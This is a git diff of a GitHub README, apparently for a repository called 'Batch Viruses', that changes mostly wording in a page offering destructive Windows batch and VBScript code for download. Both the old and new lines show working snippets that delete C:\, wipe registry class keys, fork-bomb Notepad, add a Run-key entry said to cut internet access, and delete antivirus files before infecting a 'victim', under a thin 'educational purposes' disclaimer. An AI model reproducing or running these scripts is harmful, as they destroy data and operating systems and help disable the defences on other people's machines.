@@ -1,24 +1,24 @@
 <h1 align="center"><u> Batch Viruses</u></h1>
 
-## An awesome collection of different kinds of Computer Viruses written in Batch File.
+## An awesome collection of different kinds of Computer Viruses written in the Batch File Format.
 
 ---
 <img src="https://user-images.githubusercontent.com/73777108/149873561-ace30728-a82f-466b-8e43-0433c2c2e87d.png" align="right">
 
-Create amazing yet Deadly viruses with small yet deadly codes. These can be created with just Notepad, and even be downloaded from here.
+Create (or copy) amazing yet deadly viruses with miniscule programming. These can be created with just Notepad, and even be downloaded from here.
 The viruses here are mostly very dangerous.
 
 Compiled and Edited by [SparkScratch-P](https://sparkscratch-p.github.io/).
 
 
 ---
-## ⚠️ALERT: 
+## ⚠️WARNING!!: 
 
-- These are only for educational purposes. 
-- Never try them on your own device until you are sure of what you are doing.
+- These batch files are only for educational purposes. 
+- Never try them on your own device unless you are using a VM. These batches can obviously cause serious harm to your computer.
 - Me, or any other contributor to this repo will not be responsible for any damage to your device.
 - Handle files with care and awareness.
-- Most damages can't be restored or recovered.
+- Most damage done to your OS cannot be restored or recovered.
 
 ---
 
@@ -63,7 +63,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 
 
 
-### 3. Crash Ur Computer of Windows Xp
+### 3. Crash Ur Windows Xp
 
 
 <details><summary> Read More </summary>
@@ -78,7 +78,7 @@ shutdown -r -f -t <span class="hljs-number">00</span>
 <span class="hljs-keyword">For</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">100000000</span>
 WSHShell.Run “Tourstart.exe”
 <span class="hljs-keyword">Next</span>
-</code></pre><p>This Virus works only for Windows XP, and besides formatting the drives, it damages the motherboard.</p>
+</code></pre><p>This beautifully ridiculous virus only works for Windows XP, and besides formatting the drives, it damages the motherboard.</p>
 
    
 
@@ -96,13 +96,13 @@ START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</s
 START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.dll
 START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/*
 :MESSAGE
-ECHO Your computer <span class="hljs-built_in">has</span> been fcked. Have <span class="hljs-keyword">a</span> nice day.
+ECHO Your computer <span class="hljs-built_in">has</span> been f*cked. Have <span class="hljs-keyword">a</span> nice day :)
 GOTO MESSAGE
-</code></pre><p>This virus is extremely dangerous, don&#39;t run it on your device.</p>
+</code></pre><p>This virus is <i>extremely/i> dangerous, don&#39;t run it on your device.</p>
 
   </details>
 
-### 5. The Most Simple Virus To Crush The Window. Delete C:/
+### 5. Crazy Simple Virus To Crash Modern Windows. Delete C:/
 
 
 <details><summary> Read More </summary>
@@ -111,7 +111,7 @@ GOTO MESSAGE
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus5.bat">virus5.bat</a></p>
 <pre><code>@Echo <span class="hljs-literal">off</span>
 Del C:<span class="hljs-string">\</span> *.* |y
-</code></pre><p>Your device will not restart again, after it runs once!</p>
+</code></pre><p>Your device will not restart again.</p>
 
  
   </details>
@@ -128,8 +128,8 @@ Del C:<span class="hljs-string">\</span> *.* |y
 :top
 <span class="hljs-built_in">START</span> <span class="hljs-variable">%SystemRoot%</span>\system32\notepad.exe
 <span class="hljs-keyword">GOTO</span> top
-</code></pre><p>This will open endless notepads, until ur system gets overloaded, hanged, and crashed!</p>
-<p>NOTE : If you mistakenly open it, immediately power of and force shut down your computer, else it may crash, never to start again.</p>
+</code></pre><p>This will open endless notepads, until ur system gets overloaded, hanged, and crashed!!</p>
+<p>WARNING : If you mistakenly open this batch file, immediately power off and shut down your computer (preferably by holding down the power button ), because your memory WILL get overloaded, and may not even boot again.</p>
 
  
   </details>
@@ -149,7 +149,7 @@ Del C:<span class="hljs-string">\</span> *.* |y
 <span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
 <span class="hljs-symbol">echo</span> You Have <span class="hljs-keyword">Been </span>HACKED!
 <span class="hljs-symbol">PAUSE</span>
-</code></pre><p>Your device will never ever connect to the internet if this virus runs once!</p>
+</code></pre><p>Your device will *never* connect to the internet if this virus runs!</p>
   
   </details>
  
@@ -166,7 +166,7 @@ do
 wscript.sleep <span class="hljs-comment">100</span>
 wshshell.sendkeys “<span class="hljs-comment">{CAPSLOCK}</span>”
 loop
-</code></pre><p>This repeatedly toggles your Caps Lock key. It is fully harmless and gets proper on reboot, or once the task is ended in Task Manager.</p>
+</code></pre><p>This repeatedly toggles your Caps Lock key. It is fully harmless and aborts (unindependently) on reboot, or once this task is ended in your task manager. This may cause your capslock key's LED to flicker when ran physically.</p>
 
    
   </details>
@@ -185,7 +185,7 @@ do
 wscript<span class="hljs-selector-class">.sleep</span> <span class="hljs-number">100</span>
 wshshell<span class="hljs-selector-class">.sendkeys</span> “{bs}”
 loop
-</code></pre><p>This will repeatedly keep pressing your Backspace, and will not let u type. It pops up a message; “Let’s go back a few steps”, and starts nuisence. Anyways, it is temporary, and harmless.</p>
+</code></pre><p>This will repeatedly keep sending backspace signals to windows and pops up a message; “Let’s go back a few steps”. Typing is completely disabled. This script is temporary.</p>
     
   </details>
 
@@ -324,13 +324,13 @@ del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword
 del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\webproxy\*.exe
 del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\panda software\*.*
 rem —
-</code></pre><p>This will disable your antivirus for the timbing.  One can run it on Victim computer before loading any virus to it!</p>
+</code></pre><p>This will disable your antivirus for the timbing.  A 'no no bad guy' can run it on a victims computer before loading any virus(es) to the victim.</p>
      
   </details>
  
  
  
-## This was just a list of ten. There are 25 More in our collection, here on GitHub! Just Have a look at thm:
+## This was just a snippet of 10 batch files out of our 25 in our collection. They are listed below :
 
 - Task-kill some apps
 - Command Line Notepad
@@ -425,10 +425,9 @@ Reboots the PC. ..!!!
 
 ## How to Manage Viruses?
 
-Most viruses are dangerous, and many of them are not detectable by modern Antiviruses. So, handle with care, and don't think, it is undetected, so you can freely run or use it. 
-Be sure about what you ar doing. To avoid serious problems, the `#include` libraries of some have been removed, and others are fillet with micro glitches, that you need to fix before you run them. Remember, these are only for educational, and research purposes. Read the details about all viruses on this page!
+Most, if not ALL viruses can cause some serious harm, and many of them are not detectable by modern Antiviruses. The virus game is not an easy one. So, PLEASE handle these with care, and PLEASE be sure about what you are doing. To avoid serious problems, the `#include` libraries of some have been removed.
  
-  To get a virus, download the repo, and extract. Or, copy-paste the code from here to Notepad, and save as `.bat` (Text Encoding : ASNI). These viruses works only on Windows.
+To examine this repo, download the repo, and extract the repo. Or, copy-paste the code from here to Notepad, and save as `.bat` (Text Encoding : ASNI). These viruses work only on Windows.
 
 <section id="downloads" align="center">
  
@@ -438,13 +437,12 @@ Be sure about what you ar doing. To avoid serious problems, the `#include` libra
   
 ## Developers
 
- The viruses may be preexisting, but most of thm have been slight-edited, and posted here, often toincrease the impact factor.
-
+These viruses may be pre-existing on some dusty old repos, but most of them have been slightly-edited, and posted here, often to increase the impact factor.
 Favourable points of development:
 
 - New or more impactful viruses.
 - Controlled viruses to work for good.
-- Helpful viruses.
+- Helpful viruses?
 - Documentation of more viruses, 25 left, 10 done on this page.
 - Report if it is working or not, improve glithes, report bugs.
 
@@ -456,5 +454,5 @@ Favourable points of development:
 
 ### All contributions and PRs are welcome. 
 
-<h1 align="center">⭐ Leave A Star If You Like It ⭐<h1>
-<h1 align="center">❤️ Thank You ❤️<h1>
+<h1 align="center">⭐ Leave A Star If You Like THis ⭐<h1>
+<h1 align="center">❤️ Thank You For Reading ❤️<h1>
